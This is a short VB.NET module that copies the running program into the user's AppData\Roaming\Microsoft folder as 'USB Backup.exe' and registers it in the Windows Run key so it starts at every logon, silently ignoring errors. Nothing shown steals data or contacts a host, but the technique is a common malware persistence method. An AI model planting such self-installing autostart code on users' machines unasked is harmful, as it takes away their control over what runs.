Module Startup
    Public Sub setStartup()
        Try
            Dim directory As String = IO.Path.GetFullPath(Application.ExecutablePath)
            Dim filelocation As String = "C:\Users\" & BackUp.username & "\AppData\Roaming\Microsoft\USB Backup.exe"

            If My.Computer.FileSystem.FileExists("C:\Users\" & BackUp.username & "\AppData\Roaming\Microsoft\USB Backup.exe") Then
            Else
                My.Computer.FileSystem.CopyFile(directory, filelocation,
                            Microsoft.VisualBasic.FileIO.UIOption.AllDialogs,
                            Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
            End If
            Dim stname As String = "USB Backup"
            Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
            Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            Key.SetValue(stname, filelocation, Microsoft.Win32.RegistryValueKind.String)
        Catch ex As Exception
        End Try
    End Sub
End Module
